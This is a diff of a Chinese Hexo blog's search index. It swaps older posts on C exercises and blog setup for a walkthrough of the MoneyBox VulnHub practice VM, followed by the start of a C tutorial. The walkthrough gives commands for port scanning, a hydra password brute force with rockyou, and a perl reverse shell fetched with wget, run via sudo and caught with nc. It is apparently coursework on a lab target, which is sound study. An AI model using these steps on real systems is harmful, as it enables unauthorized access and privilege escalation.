0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-
-<p>输出:</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">请输入三个数字 以逗号隔开</span><br><span class="line">3,1,6 </span><br><span class="line">max=6</span><br></pre></td></tr></tbody></table></figure>
-
-<h3 id="（2）九九乘法表"><a href="#（2）九九乘法表" class="headerlink" title="（2）九九乘法表"></a>（2）九九乘法表</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">{</span><br><span class="line">&nbsp; &nbsp; int n=9;</span><br><span class="line">&nbsp; &nbsp; int i,j;</span><br><span class="line">&nbsp; &nbsp; i=1;</span><br><span class="line">&nbsp; &nbsp; while (i&lt;=n)</span><br><span class="line">&nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; j=1;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; while (j&lt;=i)</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf("%d*%d=%d",j,i,j*i);</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if ((i*j&lt;10))</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf(" &nbsp; ");</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; } else {</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; printf(" &nbsp;");</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; j++;</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; printf("\n");</span><br><span class="line">&nbsp; &nbsp; &nbsp; &nbsp; i++;</span><br><span class="line">&nbsp; &nbsp; }</span><br><span class="line">&nbsp; &nbsp; return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
-
-<p>输出:</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">1*1=1   </span><br><span class="line">1*2=2   2*2=4   </span><br><span class="line">1*3=3   2*3=6   3*3=9   </span><br><span class="line">1*4=4   2*4=8   3*4=12  4*4=16  </span><br><span class="line">1*5=5   2*5=10  3*5=15  4*5=20  5*5=25  </span><br><span class="line">1*6=6   2*6=12  3*6=18  4*6=24  5*6=30  6*6=36  </span><br><span class="line">1*7=7   2*7=14  3*7=21  4*7=28  5*7=35  6*7=42  7*7=49  </span><br><span class="line">1*8=8   2*8=16  3*8=24  4*8=32  5*8=40  6*8=48  7*8=56  8*8=64</span><br><span class="line">1*9=9   2*9=18  3*9=27  4*9=36  5*9=45  6*9=54  7*9=63  8*9=72  9*9=81</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
-      <tags>
-        <tag>学习</tag>
-        <tag>c</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>关于加入aplayer的方式</title>
-    <url>/2023/07/05/%E5%85%B3%E4%BA%8E%E5%8A%A0%E5%85%A5aplayer%E7%9A%84%E6%96%B9%E5%BC%8F/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>因为找到工作了所以更新会稍微有点摸<br>总之先来试一下网易云的html是否可以加入音乐播放</p>
-<p>就很怪<br>网易云-生成外链播放器 再加上hexo中的md语法支持html自然可以成功<br>可是根据网上教程在主页左下角生成一个播放器的方式无法正常运行<br>下次再说吧</p>
-</body></html>]]></content>
-  </entry>
-  <entry>
-    <title>再来一次</title>
-    <url>/2023/07/01/%E6%8E%A8%E5%80%92%E9%87%8D%E6%9D%A5/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>简单来说<br>由于next旧版本与网上大部分教程无法对应<br>于是我决心直接更新推倒重来<br>网页恢复了最初始的样子<br>好消息是背景保留了</p>
-</body></html>]]></content>
-      <tags>
-        <tag>告示</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>关于在next7.8.0中建设评论功能这件事</title>
-    <url>/2023/06/30/%E5%85%B3%E4%BA%8E%E5%9C%A8next7-8-0%E4%B8%AD%E5%BB%BA%E8%AE%BE%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD%E8%BF%99%E4%BB%B6%E4%BA%8B/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>于是乎今天忙了一整天尝试在网页中建设评论功能<br>next版本为7.8.0<br>这些是我的尝试过程和失败的结果  最终使用了畅言云评完成了此功能的测试 但还仍需改进<br>接下来是每个评论模块的分别介绍<br><b>如果要看具体配置过程可以去找我在文章中留下的网址 本人小白一个 不是太懂 谢谢</b></p>
-<h2 id="valine与waline"><a href="#valine与waline" class="headerlink" title="valine与waline"></a>valine与waline</h2><p>waline由valine衍生而出</p>
-<blockquote>
-<p>Valine 特性</p>
-</blockquote>
-<ul>
-<li>快速</li>
-<li>安全</li>
-<li>Emoji 😉</li>
-<li>无后端实现</li>
-<li>MarkDown 全语法支持</li>
-<li>轻量易用(~15kb gzipped)</li>
-<li>文章阅读量统计 v1.2.0+</li>
-</ul>
-<blockquote>
-<p>Waline 与 Valine 最大的不同就是增加了服务端中间层，解决 Valine 暴露出来的安全问题。同时基于服务端的特性，提供了<strong>邮件通知</strong>、<strong>微信通知</strong>、<strong>评论后台管理</strong>、LeanCloud, MySQL, MongoDB, SQLite, PostgreSQL&nbsp;<strong>多存储服务支持</strong>等诸多特性。 —-<a href="https://zhuanlan.zhihu.com/p/295264916">摘自知乎</a></p>
-</blockquote>
-<p>我两个都试过了，valine方面参考了<a href="https://valine.js.org/">valine官方页面</a>  <a href="https://blog.csdn.net/wugenqiang/article/details/105744843">此教程</a><br>waline方面则是参考了<a href="https://waline.js.org/guide/deploy/vps.html">waline官方页面</a>  <a href="https://zhuanlan.zhihu.com/p/535607671">这个教程</a></p>
-<p>首先是在尝试时踩的坑:<br>1.valine在部署时使用的leadcloud需使用国际版，否则将需要网站备案<br>2.next7.0+的版本不会内置valine的文件，需要自己下载valine.min.js并配置cdn<br>3.统计<strong>访问人数</strong>和<strong>访问总量</strong>的系统也是由valine支持,想要同时开启会报错</p>
-<p>valine这边在全都按照流程过了一遍确认无误后却发现网页没有评论系统出现<br>只得作罢<br>waline由于next主题中的config.yml没有自带选项 需要复制粘贴<br>在确认过复制到的地区没问题的情况下 hexo s持续爆warning<br>只得作罢×2</p>
-<p>害…过几天再试吧 都是泪啊</p>
-<h2 id="gitalk"><a href="#gitalk" class="headerlink" title="gitalk"></a>gitalk</h2><blockquote>
-<p>Gitalk 特性</p>
-</blockquote>
-<ul>
-<li>使用 GitHub 登录</li>
-<li>支持多语言 [en, zh-CN, zh-TW, es-ES, fr, ru]</li>
-<li>支持个人或组织</li>
-<li>无干扰模式（设置 distractionFreeMode 为 true 开启）</li>
-<li>快捷键提交评论 （cmd|ctrl + enter）</li>
-</ul>
-<p>是github官方的评论功能<br>参考了<a href="https://www.jianshu.com/p/02fc71f3633f">这个教程</a></p>
-<p>安装后本地配置显示<strong>network error</strong><br>hexo g hexo d后也是相同的问题<br>搜索后发现是由于github网络地区特殊无法获取端口导致</p>
-<p>但目前没有具体的解决方式</p>
-<h2 id="畅言云评"><a href="#畅言云评" class="headerlink" title="畅言云评"></a>畅言云评</h2><p><a href="https://blog.csdn.net/lcyaiym/article/details/76762074">参考了这个教程</a><br>安装很简单 注册很简单 配置也只要输入appid 和appkey<br>但是具体出来的效果不太行 等待后期优化吧</p>
-</body></html>]]></content>
-      <tags>
-        <tag>学习</tag>
-        <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>目前的进展</title>
-    <url>/2023/06/29/%E7%9B%AE%E5%89%8D%E7%9A%84%E8%BF%9B%E5%B1%95/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>参考<code><a href="https://asdfv1929.github.io/2018/01/25/crash-cheat/">https://asdfv1929.github.io/2018/01/25/crash-cheat/</a></code>完成了标题特效<br>目前想做的玩意：<br>背景音乐播放<br>live2d看板娘<br>背景加上图片 亦或者动效<br>把介绍页摸完<br>完善尾注<br>剩下就是这网站因为铺设在外网<br>加载速度<b>超级慢</b></p>
-</body></html>]]></content>
-      <tags>
-        <tag>告示</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>编辑小提示</title>
-    <url>/2023/06/28/%E7%BC%96%E8%BE%91%E5%B0%8F%E6%8F%90%E7%A4%BA/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>所有hexo命令前加上npx<br>gitbash中的复制粘贴是ctrl+install shift+install<br>改完元素后记得<br><code>npx hexo clean<br>npx hexo g</code><br>本地测试效果用npx hexo s 随后用localhost:4000来连接<br>上传到网络是npx hexo d<br>接下来进一步升级网页<br>三部曲改为<br><code>hexo clean<br>hexo g<br>gulp<br>hexo d</code><br>来优化网页</p>
-</body></html>]]></content>
-      <tags>
-        <tag>hexo</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>创建个人主页！</title>
-    <url>/2023/06/28/hello-world/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>没啥事干所以就创建了<br>这里多半会写课上的笔记<br>在hexo中遇到的技术难关<br>请多指教</p>
-</body></html>]]></content>
-  </entry>
+<search> 
+  
+  
+    
+    <entry>
+      <title>moneybox解析</title>
+      <link href="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/"/>
+      <url>/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p><em><strong>注1:由于我没有解决加载问题 因此没有魔法网络的用户很有可能无法顺利看到图片 烦请根据文字自己判断一下步骤结果 谢谢</strong></em><br><em><strong>注2:该教程使用的环境是我的个人pc 实战操作可能由于系统原因 vmware配置 虚拟机版本等出现细微的不同 希望各位随机应变勇闯难关</strong></em></p><h1 id="1-关于事先配置"><a href="#1-关于事先配置" class="headerlink" title="1.关于事先配置"></a>1.关于事先配置</h1><p>安装了<strong>vmware</strong>的pc一台<br>kali <a href="https://www.kali.org/get-kali/#kali-virtual-machines">下载页面</a><br>还有我们的主角 moneybox <a href="https://www.vulnhub.com/entry/moneybox-1,653/#download">下载页面</a><br>在<strong>vmware</strong>中打开虚拟机 选择kali和moneybox并安装</p><p>为了方便后续的步骤<strong>记得在虚拟机设置-网络适配器中将两个虚拟机都设置为NAT模式</strong><br>这样你就完成了基础的配置</p><h1 id="2-具体步骤"><a href="#2-具体步骤" class="headerlink" title="2.具体步骤"></a>2.具体步骤</h1><span id="more"></span><h2 id="（1）moneybox的启动"><a href="#（1）moneybox的启动" class="headerlink" title="（1）moneybox的启动"></a>（1）moneybox的启动</h2><p>在启动时立马按e编辑启动项</p><p><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step1.jpg" alt="step1.jpg"></p><p>↑在启动项中 linux 开头这行将 <strong>ro</strong> 改成 <strong>rw single init=bin/bash</strong><br>随后按 <strong>ctrl+x</strong> 保存<br>可以通过进入单用户模式的方式修改密码<br>输入<strong>passwd root</strong> 将密码更改成任意你所希望的样子<br>这之后重启 输入账号<strong>root</strong> 与 <strong>你更改的密码</strong><br>进入后输入 <strong>dhclient</strong> 配置网络接口<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step2.jpg" alt="step2.jpg"><br>↑示例<br>随后一直挂着moneybox就可以了 转到kali这边</p><h2 id="（2）kali部分的操作"><a href="#（2）kali部分的操作" class="headerlink" title="（2）kali部分的操作"></a>（2）kali部分的操作</h2><h3 id="（2-1）找到靶机所处的网段"><a href="#（2-1）找到靶机所处的网段" class="headerlink" title="（2.1）找到靶机所处的网段"></a>（2.1）找到靶机所处的网段</h3><p>kali打开 默认账号密码是kali/kali<br>先 <strong>sudo arp-scan -l</strong> 扫描一下同网段设备<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step3.jpg" alt="step3.jpg"><br>不太确定哪个是靶机 是吧<br>先用<strong>nmap -p- 192.168.246.0/24</strong>扫描一下这些ip开放的端口<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step4.jpg" alt="step4.jpg"><br>结果说<strong>192.168.246.129</strong>开放了仨端口 分别是<strong>21 22 80</strong><br>可以确定是靶机了<br>接下来就会围绕这个ip展开操作</p><h3 id="（2-2）三个端口所引导的线索"><a href="#（2-2）三个端口所引导的线索" class="headerlink" title="（2.2）三个端口所引导的线索"></a>（2.2）三个端口所引导的线索</h3><p>首先是 <strong>21端口</strong> 对应的 <strong>ftp功能</strong><br>使用ftp+ip的方式尝试远程登陆<br>发现需要密码 回车后显示<strong>530 This FTP server is anonymous only.</strong><br>既然仅限匿名登录 那就<strong>以anonymous为账号 密码为空</strong>来登陆<br>登录完毕 ls查看目录下文件<br>有一张名为trytofind.jpg的图片 用get+文件名的方式获取<br>随后用exit退出ftp<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step5.jpg" alt="step5.jpg"><br><strong>steghide+info+图片文件名</strong>寻找是否有图片隐写 发现需要密码 线索暂时断了<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step7.jpg" alt="step7.jpg"></p><p> <em><strong>ps:关于显示steghide未安装 随后无法安装显示E:Unable to locate package的解决方式</strong></em></p><blockquote><p>第一步：打开sources.list文件</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/apt/sources.list</span><br></pre></td></tr></tbody></table></figure><blockquote><p>第二步：在文件中添加以下内容</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deb http://http.kali.org/kali kali-rolling main contrib non-free</span><br><span class="line">deb http://http.kali.org/kali sana main non-free contrib</span><br><span class="line">deb http://security.kali.org/kali-security sana/updates main contrib non-free</span><br><span class="line">deb http://old.kali.org/kali moto main non-free contrib</span><br></pre></td></tr></tbody></table></figure><blockquote><p>然后保存退出，再进行更新</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></tbody></table></figure><blockquote><p>————————————————<br>版权声明：上面这段说明为CSDN博主「聂大哥」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_43729943/article/details/104221462">https://blog.csdn.net/weixin_43729943/article/details/104221462</a></p></blockquote><p><strong>22端口所对应的ssh功能</strong>通常需要账号密码 目前没有线索 我们先转到http上去寻找<br>打开firefox 我们输入ip地址<strong>192.168.246.129</strong><br>进入主页<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step8.jpg" alt="step8.jpg"><br>我们<strong>f12</strong>查看一下源码<br>发现啥也没藏<br>于是使用我们的工具<br><strong>dirb+网址</strong>来寻找是否有潜在的目录<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step9.jpg" alt="step9.jpg"><br>↑运行结果发现了名为<a href="http://192.168.246.129/blogs/index.html%E7%9A%84%E7%9B%AE%E5%BD%95">http://192.168.246.129/blogs/index.html的目录</a><br>进入网址<br>还是老样子<strong>f12</strong>查看源码 发现注释里藏了点东西<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step10.jpg" alt="step10.jpg"><br>它说是提示在这个目录里 那就进入<a href="http://192.168.246.129/S3cr3t-T3xt/">http://192.168.246.129/S3cr3t-T3xt/</a><br>还是在源码里藏了东西<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step11.jpg" alt="step11.jpg"><br>发现了一段Secret Key 保存下来备用<br>我们猜测这段密文和steghide中的密码相对应 尝试输入<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step12.jpg" alt="step12.jpg"><br>提取出了<strong>data.txt</strong><br>其中内容为暗示一个<strong>名为renu的用户</strong>的密码强度很弱<br>或许可以使用密码爆破来获得密码<br>于是我们可以利用<strong>kali自带的密码爆破字典</strong>与<strong>hydra</strong>来爆破<br>rockyou.txt被压缩，需要解压才能够使用</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gzip -d /usr/share/wordlists/rockyou.txt.gz#-d 将压缩文件解压</span><br><span class="line">ll /usr/share/wordlists/rockyou.txt#显示当前目录下文件详细信息</span><br></pre></td></tr></tbody></table></figure><p><em><strong>hydra使用方法:</strong></em></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -P 密码字典 协议://ip地址</span><br></pre></td></tr></tbody></table></figure><p><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step13.jpg" alt="step13.jpg"><br>↑试出来的结果是密码为987654321</p><h3 id="2-3-ssh连接与操作"><a href="#2-3-ssh连接与操作" class="headerlink" title="(2.3)ssh连接与操作"></a>(2.3)ssh连接与操作</h3><p>使用<strong>ssh+账号@ip:端口</strong>来链接renu<br>输入密码 链接成功<br>输入ls来查看文件 有一个txt<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step14.jpg" alt="step14.jpg"><br>↑cat user1.txt获得第一个flag<br>第二个flag在于这个电脑所留下的操作历史<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step15.jpg" alt="step15.jpg"><br>里面有免密登陆一个叫lily的用户的过程<br>说明此用户已经将自己的公钥拷贝到了靶机系统上的lily用户家目录的authorized_keys文件，从而可以不用密码就以lily身份登录到靶机上。<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step16.jpg" alt="step16.jpg"><br>第二个flag也获得了<br>第三个flag多半是在root账号中<br>但sudo的权限也无法查看<br><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step17.jpg" alt="step17.jpg"><br>这里就要用到一些高级操作<br>我这里直接引用课上的讲义了</p><blockquote><p>执行sudo -l发现该用户存在sudo赋权，程序为/usr/bin/perl，perl同python类似，也是一门解释型语言，推测靶机应该有perl运行环境。下面是如何通过Perl程序提权的实现过程。<br>思路：kali中自带perl脚本反弹shell，将其略加修改拷贝到靶机上；该脚本需要在渗透机监听一个端口(默认为1234)，然后在靶机上运行perl脚本，靶机会自动反弹一个shell到渗透机，从而通过运行perl程序获得一个管理员的Shell。</p></blockquote><ol><li>定位kali中的perl脚本反弹shell，将其拷贝到kali的/var/www/html下，重命名为p.php；<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/webshells/perl</span><br><span class="line">sudo cp perl-reverse-shell.pl /var/www/html/p.php</span><br><span class="line">cd /var/www/html</span><br><span class="line">ls</span><br></pre></td></tr></tbody></table></figure><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step18.jpg" alt="step18.jpg"></li><li>修改p.php文件内容，将反弹连接的Ip地址改为kali的IP；<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim p.php //把my $ip这段单引号里面的ip改成kali的</span><br></pre></td></tr></tbody></table></figure><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step19.jpg" alt="step19.jpg"></li><li>开启kali的网站服务<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start apache2</span><br></pre></td></tr></tbody></table></figure><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step20.jpg" alt="step20.jpg"></li><li>切换到靶机lily会话，通过http协议下载p.php<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://ip/p.php //不知道ip的可以在另个窗口ifconfig查看</span><br></pre></td></tr></tbody></table></figure><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step21.jpg" alt="step21.jpg"></li><li>kali 通过nc命令监听1234端口<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 1234</span><br></pre></td></tr></tbody></table></figure><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step22.jpg" alt="step22.jpg"></li><li>靶机上通过sudo 运行p.php程序<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/perl p.php</span><br></pre></td></tr></tbody></table></figure><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step23.jpg" alt="step23.jpg"></li><li>切换到渗透机kali，成功反弹管理员权限shell<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">cd /root</span><br><span class="line">ls -a</span><br><span class="line">cat .root.txt</span><br></pre></td></tr></tbody></table></figure><img data-src="/2023/10/22/moneybox%E8%A7%A3%E6%9E%90/step24.jpg" alt="step24.jpg"></li><li>拿到最终flag啦！<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Congratulations.......!</span><br><span class="line"></span><br><span class="line">You Successfully completed MoneyBox</span><br><span class="line"></span><br><span class="line">Finally The Root Flag</span><br><span class="line">    ==&gt; r00t{H4ckth3p14n3t}</span><br><span class="line"></span><br><span class="line">I'm Kirthik-KarvendhanT</span><br><span class="line">    It's My First CTF Box</span><br><span class="line">         </span><br><span class="line">instagram : ____kirthik____</span><br><span class="line"></span><br><span class="line">See You Back....</span><br></pre></td></tr></tbody></table></figure></li></ol><h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3.总结"></a>3.总结</h1><p>前两个flag较为简易 最后一个flag要花点力气<br>希望今后的学习能让我更透彻的理解渗透测试的奥妙<br>那么 下次再见！</p></body></html>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 学习 </tag>
+            
+            <tag> 靶机解析 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>要置顶的公告</title>
+      <link href="/2023/08/05/%E8%A6%81%E7%BD%AE%E9%A1%B6%E7%9A%84%E5%85%AC%E5%91%8A/"/>
+      <url>/2023/08/05/%E8%A6%81%E7%BD%AE%E9%A1%B6%E7%9A%84%E5%85%AC%E5%91%8A/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><h1 id="新朋友初次见面-老朋友好久不见-这里是猫涅"><a href="#新朋友初次见面-老朋友好久不见-这里是猫涅" class="headerlink" title="新朋友初次见面 老朋友好久不见 这里是猫涅"></a>新朋友初次见面 老朋友好久不见 这里是猫涅</h1><p>2023/9/5 更新：<br>超绝帅气的介绍页进入页面已经<s>借助chatgpt的伟力</s>完成了<br>后期完善会在那里加点分支<br>还有就是随笔啥的多半会加到里面 博客主题仅分享学术内容好了<br>2023/10/22 更新:<br>c语言这块还差一点收尾的环节<br>介绍一下新环节 靶机分析<br>课上讲过的再通过图文还原一下<br>2023/10/26 更新:<br>icon全面更换为了自制手绘icon 耶<br><img data-src="/2023/08/05/%E8%A6%81%E7%BD%AE%E9%A1%B6%E7%9A%84%E5%85%AC%E5%91%8A/medium.png" alt="icon"></p><p><a href="https://markdown.com.cn/cheat-sheet.html">关于markdown的写作相关</a> </p><p>ps:<br>hexo装到奇怪的地方了 所以git bash的时候命令前记得加npx<br>还有就是git bash中的复制粘贴分别是<br><strong>复制: ctrl + insert</strong><br><strong>粘贴: shift + insert</strong></p><p>无渲染跳转方式: 在文章前加入</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">layout: false </span><br><span class="line">--- </span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 告示 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>C语言 启动！</title>
+      <link href="/2023/08/01/C%E8%AF%AD%E8%A8%80%20%E5%90%AF%E5%8A%A8%EF%BC%81/"/>
+      <url>/2023/08/01/C%E8%AF%AD%E8%A8%80%20%E5%90%AF%E5%8A%A8%EF%BC%81/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>所以 最近很闲 所以开始学c语言</p><span id="more"></span><h1 id="准备步骤"><a href="#准备步骤" class="headerlink" title="准备步骤"></a>准备步骤</h1><p>我使用了visual studio code配置c语言环境的方法来实现程序的调试和运行<br><a href="https://www.bilibili.com/video/BV19c411G7ey">我所参考的教程</a></p><h1 id="学习笔记啥的"><a href="#学习笔记啥的" class="headerlink" title="学习笔记啥的"></a>学习笔记啥的</h1><h2 id="一-经典到不能再经典的hello-world"><a href="#一-经典到不能再经典的hello-world" class="headerlink" title="一.经典到不能再经典的hello world"></a>一.经典到不能再经典的hello world</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"> </span><br><span class="line">int main()</span><br><span class="line">{</span><br><span class="line">    /* 我的第一个 C 程序 */</span><br><span class="line">    printf("Hello, World! \n");</span><br><span class="line"> </span><br><span class="line">    return 0;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><strong>实例解析：</strong></p><ul><li>所有的 C 语言程序都需要包含&nbsp;<strong>main()</strong>&nbsp;函数。 代码从&nbsp;<strong>main()</strong>&nbsp;函数开始执行。</li><li><strong>/* … */</strong>&nbsp;用于注释说明。</li><li><strong>printf()</strong>&nbsp;用于格式化输出到屏幕。<strong>printf()</strong>&nbsp;函数在&nbsp;<strong>“stdio.h”</strong>&nbsp;头文件中声明。</li><li><strong>stdio.h</strong>&nbsp;是一个头文件 (标准输入输出头文件) ,&nbsp;<strong>#include</strong>&nbsp;是一个预处理命令，用来引入头文件。 当编译器遇到&nbsp;<strong>printf()</strong>&nbsp;函数时，如果没有找到&nbsp;<strong>stdio.h</strong>&nbsp;头文件，会发生编译错误。</li><li><strong>return 0;</strong>&nbsp;语句用于表示退出程序。</li></ul><h2 id="二-关于定义变量和变量的类型"><a href="#二-关于定义变量和变量的类型" class="headerlink" title="二.关于定义变量和变量的类型"></a>二.关于定义变量和变量的类型</h2><h3 id="（1）单纯的计算"><a href="#（1）单纯的计算" class="headerlink" title="（1）单纯的计算"></a>（1）单纯的计算</h3><figure 